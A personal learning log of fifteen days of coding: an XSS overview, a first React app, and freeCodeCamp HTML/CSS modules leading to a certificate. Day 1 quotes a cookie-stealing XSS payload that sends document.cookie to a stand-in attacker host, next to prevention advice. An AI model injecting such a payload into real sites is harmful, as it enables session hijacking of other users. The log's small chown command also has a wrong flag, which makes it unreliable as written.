
  

# 100 Days of Coding - Log

  

## Start of Log

  

## Day 1 - July 24, 2019

**Subject:** Cross-Site Scripting

**Today's Progress:** I was able to understand the concept of Cross-Site Scripting (XSS), it's use and prevention.

  

**Thoughts:**

XSS flaws occur whenever an applications includes untrusted data in a new web page without proper validation or escaping or updates a n existing web page w/ user supplied data using a browser api that can create Javascript.

  

It enables attackers to inject client-side scripts into web pages viewed by other users.

  

### What does XSS can do?

- Malicious javascript can be used to do all sorts of malicious attacks because basically, it can access the api or anything that connects to the database. it also can affect the behavior of the page.

- it can be used to steal user cookies that allows the attacker to use the website pretendingto be that user that he stole.

  

### Example of injections to the `<input>` tags or in the URL:

`><script>document.location='http://www.attacker.com/cgi-bin/cookie.cgi?foo='+document.cookie</script>`.

  

or other HTML Tags like what i've tested `<i>` which transformed the remainder of the elements in the HTML Body into _Italic_.

  

### Preventions:

- The preferred option is to properly escape untrusted data based on HTML context that the data will be placed into.

- avoid passing untrusted data to Javascript and other browser APIs that can generate active content.

##

  

## Day 2 - July 25, 2019

  

**Subject:** Javascript (ReactJS)

  

**Today's Progress:** I started creating my first react app with `npx create-react-app react-app` and created my own _index.js_ file.

  

**Thoughts:**

  

I Encountered a problem in running the `npm install -g create-react-app` and `npx create-react-app react-app` commands on my terminal so i had to surf on the web on how can i fix it. but luckily it was fixed by running the `sudo chown -r <path>` command.

  

  

I run my app with `npm start` on the terminal and prints _Hello World_

  

  

I put these lines of codes in my _index.js_ as a test for starting the app.

  

  

```

import React from 'react';

import ReactDOM from 'react-dom';

  

const App = () => {

return <div>Hello World</div>

};

  

ReactDOM.render(

<App />,

document.querySelector('#root')

);

```

<br>

  

| import | React | from | 'react' |

|---------|-------|------|---------|

|gives me access to<br>codes from other files<br>or dependencies <br> that I will import.|The variable I want <br> to assign this import<br> to.| I'm about to specify<br>the name of the<br>library or file that I'm<br>importing from.|The name of the<br>dependency or <br> path to the file I<br>am importing.

  

###

  

`ReactDOM.render` takes the component and shows it on the screen.

  

##

  

## Day 3 - July 26, 2019

  

**Subject:** Basic HTML and HTML5

  

**Today's Progress:** I finished the first part of the Responsive Web Design Certification in [https://learn.freecodecamp.org/](https://learn.freecodecamp.org/) which is Basic HTML and HTML5.

  

![enter image description here](https://i.imgur.com/M3IzbHz.png)

  

##

  

## Day 4 - July 29, 2019

  

**Subject:** Basic CSS

  

**Today's Progress:** I continued working with the course on freecodecamp site and done with changing color text up to sizing images.

![enter image description here](https://i.imgur.com/62Mubc2.png)

  

##

  

## Day 5 - July 30, 2019

**Subject:** Basic CSS

  

**Today's Progress:** I continued working with the course on freecodecamp site and done with more than half of the topic. I've finished starting from Adding Borders around the Element up to Override styles in Subsequent CSS.

  

![enter image description here](https://i.imgur.com/s1dpdHM.png)

  
  

## Day 6 - July 31, 2019

**Subject:** Basic CSS

  

**Today's Progress:** I finished the course for the `Basic CSS` and tried to create variables that can be use all through the CSS file.

  

![enter image description here](https://i.imgur.com/eWT2INn.png)

  

## Day 7 - August 1, 2019

**Subject:** Applied Visual Design / CSS

  

**Today's Progress:** I started working with the `Applied Visual Design` Course in the freecodecamp site and had reviewed about some of the techniques in HTML and CSS.

  

![enter image description here](https://i.imgur.com/GtaJ0kV.png)

![enter image description here](https://i.imgur.com/GH339YD.png)

  

## Day 8 - August 2, 2019

**Subject:** Applied Visual Design / CSS

  

**Today's Progress:** I continued working with the `Applied Visual Design` Course and learned new things that I haven't use in my coding career. I mostly use the hex code `#` or the `rgba()` for color specifications but recently here in the codecamp, I learned about the `hsl()` for _Hue, Saturation and Lightness_ which will be a good help when I proceed with the designing for future projects. I also tried to create a graphic object by using css codes. I managed to had a _Moon_ output as a graphic object and tried to manipulate other `HTML ELEMENTS`.

  

![enter image description here](https://i.imgur.com/PeZMwuK.png)

  

## Day 9 - August 5, 2019

**Subject:** Applied Visual Design / CSS

  

**Today's Progress:** I continued working with the `Applied Visual Design` and finished the whole course. I tried to create complex shape and animation by keyframes using CSS.

  

![Here are the remaining exercises on the course](https://i.imgur.com/avT7H53.png)

  

## Day 10 - August 6, 2019

**Subject:** Applied Accessibility / CSS

  

**Today's Progress:** I finished one module today which is `Applied Accessibility` in the freecodecamp and tried to put `<audio>`  `<figure>` and other new tags.

  

![Full course of Applied Accessibility](https://i.imgur.com/uz1KhC0.png)

  

## Day 11 - August 7, 2019

**Subject:**

1. Responsive Web Design Principles

2. CSS Flexbox

  

**Today's Progress:** I finished 2 modules in the Responsive Web Design Certification Course which is the 2 given subjects. I tried to use media queries to have a responsive page on any device size and also used flex grid to have proper responsive grid for html elements.

  

![Responsive Web Design Principles and CSS Flexbox](https://i.imgur.com/r9JzGhj.png)

## Day 12 - August 8, 2019

**Subject:** CSS GRID & Responsive Web Design Projects

**Today's Progress:** I finished the module for the CSS Grid and tried to maker responsive elements using the grid attributes in CSS. I also started with the Responsive Web Design Projects and finished creating a _Tribute Page_ which passed the user criteria in the module. I used the new HTML Elements

```
<section>
<figure>
<figcaption>
<main>
```
![enter image description here](https://i.imgur.com/hPTFG73.png)

![enter image description here](https://i.imgur.com/EnUFLt4.png)

## Day 13 - August 11, 2019

**Subject:** Responsive Web Design Projects (Survey Form)

**Today's Progress:** For today, I finished again 1 project that is required for the Responsive Web Design Certification at learn.freecodecamp.org. The project consists of practice for different HTML tags. It focuses on the common things that is needed on a survey form. In this project, I created first a title by using the `<h1>` tag and then the `<form>` followed by creating `<input>` tags for the textboxes for the name, email and age. After making sure its types, I tried to add placeholders on the tags so that it has guide or instruction for the user. After that, I use the `<select>` and `<option>` for having a dropdown selection. Also, I put radio button and checkboxes as it was stated on the criteria that it is needed on the survey form. After that, I put a `<textarea>` tag for the comments or suggestions for the survey forms and then lastly, I put a submit `<button>` to pass the inputs on the form. I finished all the user criteria and passed the project.

![My Survey Form Project](https://i.imgur.com/0jHQhWB.png)

## Day 14 - August 12, 2019

**Subject:** Responsive Web Design Projects (Product Landing Page)

**Today's Progress:** I finished the project by creating a basic landing page and I used different html tags and css. I tried to make the nav bar fixed on top and also I practiced flexbox for a responsive webpage. On top of that, I also used media query to make it more responsive to the device width. As for today, I'm 2 projects away from the Responsive Web Design Certification.

## Day 15 - August 13, 2019

**Subject:** Responsive Web Design Projects

**Today's Progress:** I finished the last 2 projects of the _Responsive Web Design Projects_
 and finally done with the _Responsive Web Design Course_ and got my Certification for the camp. The last two projects were about a Documentation and a Portfolio which I used commonly `<section>` and `<nav>` most especially side navs.
 
 ![My Certificate for the code camp](https://i.imgur.com/jdyKoze.png)
